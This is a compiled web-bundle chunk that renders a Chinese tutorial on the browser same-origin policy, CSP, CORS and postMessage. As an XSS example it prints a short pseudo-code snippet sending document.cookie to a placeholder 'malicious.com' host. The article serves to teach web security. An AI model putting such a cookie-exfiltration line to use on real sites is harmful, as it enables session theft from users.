(window.webpackJsonp=window.webpackJsonp||[]).push([[49],{485:function(v,_,t){"use strict";t.r(_);var e=t(27),s=Object(e.a)({},(function(){var v=this,_=v.$createElement,t=v._self._c||_;return t("ContentSlotsDistributor",{attrs:{"slot-key":v.$parent.slotKey}},[t("h1",{attrs:{id:"_32-同源策略：为什么xmlhttprequst不能跨域请求资源"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_32-同源策略：为什么xmlhttprequst不能跨域请求资源"}},[v._v("#")]),v._v(" 32.同源策略：为什么XMLHttpRequst不能跨域请求资源")]),v._v(" "),t("p",[v._v("通过前面 "),t("code",[v._v("6")]),v._v(" 个模块的介绍，我们已经大致知道浏览器是怎么工作的了，也了解这种工作方式对前端产生了什么样的影响。在这个过程中，我们还穿插介绍了一些浏览器安全相关的内容，不过都比较散，所以最后的 "),t("code",[v._v("5")]),v._v(" 篇文章，我们就来系统地介绍下浏览器安全相关的内容。")]),v._v(" "),t("p",[v._v("浏览器安全可以分为"),t("strong",[v._v("三大块")]),v._v("——"),t("strong",[t("code",[v._v("Web")]),v._v(" 页面安全")]),v._v("、"),t("strong",[v._v("浏览器网络安全")]),v._v("和"),t("strong",[v._v("浏览器系统安全")]),v._v("，所以本模块我们就按照这个思路来做介绍。鉴于"),t("strong",[v._v("页面安全")]),v._v("的重要性，我们会用三篇文章来介绍该部分的知识；网络安全和系统安全则分别用一篇来介绍。")]),v._v(" "),t("p",[v._v("今天我们就先来分析页面中的安全策略，不过在开始之前，我们先来做个假设，如果页面中没有安全策略的话，"),t("code",[v._v("Web")]),v._v(" 世界会是什么样子的呢？")]),v._v(" "),t("p",[t("code",[v._v("Web")]),v._v(" 世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 / 视频等资源，甚至可以下载其他站点的可执行文件。")]),v._v(" "),t("p",[t("code",[v._v("Web")]),v._v(" 世界是开放的，这很符合 "),t("code",[v._v("Web")]),v._v(" 理念。但如果 "),t("code",[v._v("Web")]),v._v(" 世界是绝对自由的，那么页面行为将没有任何限制，这会造成无序或者混沌的局面，出现很多不可控的问题。")]),v._v(" "),t("p",[v._v("比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：")]),v._v(" "),t("ul",[t("li",[v._v("修改银行站点的 "),t("code",[v._v("DOM")]),v._v("、"),t("code",[v._v("CSSOM")]),v._v(" 等信息；")]),v._v(" "),t("li",[v._v("在银行站点内部插入 "),t("code",[v._v("JavaScript")]),v._v(" 脚本；")]),v._v(" "),t("li",[v._v("劫持用户登录的用户名和密码；")]),v._v(" "),t("li",[v._v("读取银行站点的 "),t("code",[v._v("Cookie")]),v._v("、"),t("code",[v._v("IndexedDB")]),v._v(" 等数据；")]),v._v(" "),t("li",[v._v("甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。")])]),v._v(" "),t("p",[v._v("所以说，在没有安全保障的 "),t("code",[v._v("Web")]),v._v(" 世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全。")]),v._v(" "),t("p",[v._v("这就引出了页面中最基础、最核心的安全策略："),t("strong",[v._v("同源策略")]),v._v("（"),t("code",[v._v("Same-origin policy")]),v._v("）。")]),v._v(" "),t("h2",{attrs:{id:"什么是同源策略"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#什么是同源策略"}},[v._v("#")]),v._v(" 什么是同源策略")]),v._v(" "),t("p",[v._v("要了解什么是同源策略，我们得先来看看什么是同源。")]),v._v(" "),t("p",[v._v("如果两个 "),t("code",[v._v("URL")]),v._v(" 的协议、域名和端口都相同，我们就称这两个 "),t("code",[v._v("URL")]),v._v(" 同源。比如下面这两个 "),t("code",[v._v("URL")]),v._v("，它们具有相同的协议 "),t("code",[v._v("HTTPS")]),v._v("、"),t("strong",[v._v("相同的域名")]),t("code",[v._v("time.geekbang.org")]),v._v("，以及"),t("strong",[v._v("相同的端口")]),v._v(" "),t("code",[v._v("443")]),v._v("，所以我们就说这两个 "),t("code",[v._v("URL")]),v._v(" 是"),t("strong",[v._v("同源的")]),v._v("。")]),v._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[v._v("https://time.geekbang.org/?category=1\nhttps://time.geekbang.org/?category=0\n")])]),v._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[v._v("1")]),t("br"),t("span",{staticClass:"line-number"},[v._v("2")]),t("br")])]),t("p",[v._v("浏览器默认两个"),t("strong",[v._v("相同的源")]),v._v("之间是可以"),t("strong",[v._v("相互访问资源")]),v._v("和"),t("strong",[v._v("操作 "),t("code",[v._v("DOM")])]),v._v(" 的。两个不同的源之间若想要相互访问资源或者操作 "),t("code",[v._v("DOM")]),v._v("，那么会有一套"),t("strong",[v._v("基础的安全策略")]),v._v("的制约，我们把这称为"),t("strong",[v._v("同源策略")]),v._v("。")]),v._v(" "),t("p",[v._v("具体来讲，同源策略主要表现在 "),t("code",[v._v("DOM")]),v._v("、"),t("strong",[t("code",[v._v("Web")]),v._v(" 数据")]),v._v("和"),t("strong",[v._v("网络")]),v._v("这三个层面。")]),v._v(" "),t("p",[t("strong",[v._v("第一个，"),t("code",[v._v("DOM")]),v._v(" 层面")]),v._v("。同源策略限制了来自不同源的 "),t("code",[v._v("JavaScript")]),v._v(" 脚本对当前 "),t("code",[v._v("DOM")]),v._v(" 对象读和写的操作。")]),v._v(" "),t("p",[t("strong",[v._v("第二个，数据层面。同源策略限制了不同源的站点读取当前站点的 "),t("code",[v._v("Cookie")]),v._v("、"),t("code",[v._v("IndexedDB")]),v._v("、"),t("code",[v._v("LocalStorage")]),v._v(" 等数据")]),v._v("。由于同源策略，我们依然无法通过第二个页面的 "),t("code",[v._v("opener")]),v._v(" 来访问第一个页面中的 "),t("code",[v._v("Cookie")]),v._v("、"),t("code",[v._v("IndexedDB")]),v._v(" 或者 "),t("code",[v._v("LocalStorage")]),v._v(" 等内容。你可以自己试一下，这里我们就不做演示了。")]),v._v(" "),t("p",[t("strong",[v._v("第三个，网络层面")]),v._v("。同源策略限制了通过 "),t("code",[v._v("XMLHttpRequest")]),v._v(" 等方式将站点的数据发送给"),t("strong",[v._v("不同源的站点")]),v._v("。你还记得在《"),t("code",[v._v("17")]),v._v(" | "),t("code",[v._v("WebAPI")]),v._v("："),t("code",[v._v("XMLHttpRequest")]),v._v(" 是怎么实现的？》这篇文章的末尾分析的 "),t("code",[v._v("XMLHttpRequest")]),v._v(" 在使用过程中所遇到的坑吗？其中第一个坑就是在默认情况下"),t("strong",[v._v("不能访问跨域的资源")]),v._v("。")]),v._v(" "),t("h2",{attrs:{id:"安全和便利性的权衡"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#安全和便利性的权衡"}},[v._v("#")]),v._v(" 安全和便利性的权衡")]),v._v(" "),t("p",[v._v("我们了解了同源策略会隔离不同源的 "),t("code",[v._v("DOM")]),v._v("、页面数据和网络通信，进而实现 "),t("code",[v._v("Web")]),v._v(" 页面的安全性。")]),v._v(" "),t("p",[v._v("不过"),t("strong",[v._v("安全性")]),v._v("和"),t("strong",[v._v("便利性")]),v._v("是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 "),t("code",[v._v("Web")]),v._v(" 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 "),t("strong",[t("code",[v._v("XSS")]),v._v(" 攻击")]),v._v("和 "),t("strong",[t("code",[v._v("CSRF")]),v._v(" 攻击")]),v._v("，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。")]),v._v(" "),t("h3",{attrs:{id:"_1-页面中可以嵌入第三方资源"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-页面中可以嵌入第三方资源"}},[v._v("#")]),v._v(" 1. 页面中可以嵌入第三方资源")]),v._v(" "),t("p",[v._v("我们在文章开头提到过，"),t("code",[v._v("Web")]),v._v(" 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 "),t("code",[v._v("HTML")]),v._v(" 文件、"),t("code",[v._v("JavaScript")]),v._v(" 文件、"),t("code",[v._v("CSS")]),v._v(" 文件、图片等资源都部署在同一台服务器上，这无疑违背了 "),t("code",[v._v("Web")]),v._v(" 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 "),t("code",[v._v("CDN")]),v._v(" 上时，"),t("code",[v._v("CDN")]),v._v(" 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。")]),v._v(" "),t("p",[v._v("所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些"),t("strong",[v._v("恶意程序劫持")]),v._v("，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 "),t("code",[v._v("HTML")]),v._v(" 文件中插入恶意脚本。")]),v._v(" "),t("p",[v._v("比如，恶意程序在 "),t("code",[v._v("HTML")]),v._v(" 文件内容中插入如下一段 "),t("code",[v._v("JavaScript")]),v._v(" 代码")]),v._v(" "),t("p",[t("img",{attrs:{src:"http://ahuntsun.gitee.io/blogimagebed/img/browser/part6/ls32/1.png",alt:""}})]),v._v(" "),t("p",[v._v("当这段"),t("code",[v._v("HTML")]),v._v(" 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、"),t("strong",[v._v("改变")]),v._v("一些内容的"),t("strong",[v._v("连接指向")]),v._v("，等等。")]),v._v(" "),t("p",[v._v("除此之外，它还能将页面的的敏感数据，如 "),t("code",[v._v("Cookie")]),v._v("、"),t("code",[v._v("IndexDB")]),v._v("、"),t("code",[v._v("LoacalStorage")]),v._v(" 等数据通过 "),t("code",[v._v("XSS")]),v._v(" 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个"),t("strong",[v._v("恶意链接")]),v._v("时，恶意 "),t("code",[v._v("JavaScript")]),v._v(" 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：")]),v._v(" "),t("div",{staticClass:"language-js line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-js"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[v._v("function")]),v._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[v._v("onClick")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[v._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[v._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[v._v("{")]),v._v("\n  "),t("span",{pre:!0,attrs:{class:"token keyword"}},[v._v("let")]),v._v(" url "),t("span",{pre:!0,attrs:{class:"token operator"}},[v._v("=")]),v._v(" "),t("span",{pre:!0,attrs:{class:"token template-string"}},[t("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[v._v("`")]),t("span",{pre:!0,attrs:{class:"token string"}},[v._v("http://malicious.com?cookie = ")]),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[v._v("${")]),v._v("document"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[v._v(".")]),v._v("cookie"),t("span",{pre:!0,attrs:{class:"token interpolation-punctuation punctuation"}},[v._v("}")])]),t("span",{pre:!0,attrs:{class:"token template-punctuation string"}},[v._v("`")])]),v._v("\n  "),t("span",{pre:!0,attrs:{class:"token function"}},[v._v("open")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[v._v("(")]),v._v("url"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[v._v(")")]),v._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[v._v("}")]),v._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[v._v("onClick")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[v._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[v._v(")")]),v._v("\n")])]),v._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[v._v("1")]),t("br"),t("span",{staticClass:"line-number"},[v._v("2")]),t("br"),t("span",{staticClass:"line-number"},[v._v("3")]),t("br"),t("span",{staticClass:"line-number"},[v._v("4")]),t("br"),t("span",{staticClass:"line-number"},[v._v("5")]),t("br")])]),t("p",[v._v("在这段代码中，恶意脚本读取 "),t("code",[v._v("Cookie")]),v._v(" 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 "),t("code",[v._v("Cookie")]),v._v(" 信息。")]),v._v(" "),t("p",[v._v("以上就是一个非常典型的 "),t("code",[v._v("XSS")]),v._v(" 攻击。为了解决 "),t("code",[v._v("XSS")]),v._v(" 攻击，浏览器中引入了"),t("strong",[v._v("内容安全策略")]),v._v("，称为 "),t("code",[v._v("CSP")]),v._v("。"),t("code",[v._v("CSP")]),v._v(" 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 "),t("code",[v._v("JavaScript")]),v._v(" 代码。通过这些手段就可以大大减少 "),t("code",[v._v("XSS")]),v._v(" 攻击。")]),v._v(" "),t("h3",{attrs:{id:"_2-跨域资源共享和跨文档消息机制"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-跨域资源共享和跨文档消息机制"}},[v._v("#")]),v._v(" 2. 跨域资源共享和跨文档消息机制")]),v._v(" "),t("p",[v._v("默认情况下，如果打开极客邦的官网页面，在官网页面中通过 "),t("code",[v._v("XMLHttpRequest")]),v._v(" 或者 "),t("code",[v._v("Fetch")]),v._v(" 来请求 "),t("code",[v._v("InfoQ")]),v._v(" 中的资源，这时同源策略会阻止其向 "),t("code",[v._v("InfoQ")]),v._v(" 发出请求，这样会大大制约我们的生产力。")]),v._v(" "),t("p",[v._v("为了解决这个问题，我们引入了"),t("strong",[v._v("跨域资源共享")]),v._v("（"),t("code",[v._v("CORS")]),v._v("），使用该机制可以进行"),t("strong",[v._v("跨域访问控制")]),v._v("，从而使跨域数据传输得以安全进行。")]),v._v(" "),t("p",[v._v("在介绍同源策略时，我们说明了如果两个页面不是同源的，则"),t("strong",[v._v("无法相互操纵 "),t("code",[v._v("DOM")])]),v._v("。不过在实际应用中，经常需要两个不同源的 "),t("code",[v._v("DOM")]),v._v(" 之间进行通信，于是浏览器中又引入了"),t("strong",[v._v("跨文档消息机制")]),v._v("，可以通过 "),t("code",[v._v("window.postMessage")]),v._v(" 的 "),t("code",[v._v("JavaScript")]),v._v(" 接口来和不同源的 "),t("code",[v._v("DOM")]),v._v(" 进行"),t("strong",[v._v("通信")]),v._v("。")]),v._v(" "),t("h2",{attrs:{id:"总结"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[v._v("#")]),v._v(" 总结")]),v._v(" "),t("p",[v._v("好了，今天就介绍到这里，下面我来总结下本文的主要内容。")]),v._v(" "),t("p",[v._v("同源策略会"),t("strong",[v._v("隔离不同源")]),v._v("的 "),t("code",[v._v("DOM")]),v._v("、"),t("strong",[v._v("页面数据")]),v._v("和"),t("strong",[v._v("网络通信")]),v._v("，进而实现 "),t("code",[v._v("Web")]),v._v(" 页面的安全性。")]),v._v(" "),t("p",[v._v("不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：")]),v._v(" "),t("p",[v._v("页面中可以引用第三方资源，不过这也暴露了很多诸如 "),t("code",[v._v("XSS")]),v._v(" 的安全问题，因此又在这种开放的基础之上引入了 "),t("code",[v._v("CSP")]),v._v(" 来限制其自由程度。\n使用 "),t("code",[v._v("XMLHttpRequest")]),v._v(" 和 "),t("code",[v._v("Fetch")]),v._v(" 都是"),t("strong",[v._v("无法直接进行跨域请求")]),v._v("的，因此浏览器又在这种严格策略的基础之上引入了"),t("strong",[v._v("跨域资源共享策略")]),v._v("，让其可以安全地进行跨域操作。\n两个不同源的 "),t("code",[v._v("DOM")]),v._v(" 是不能相互操纵的，因此，浏览器中又实现了"),t("strong",[v._v("跨文档消息机制")]),v._v("，让其可以比较安全地通信。")])])}),[],!1,null,null,null);_.default=s.exports}}]);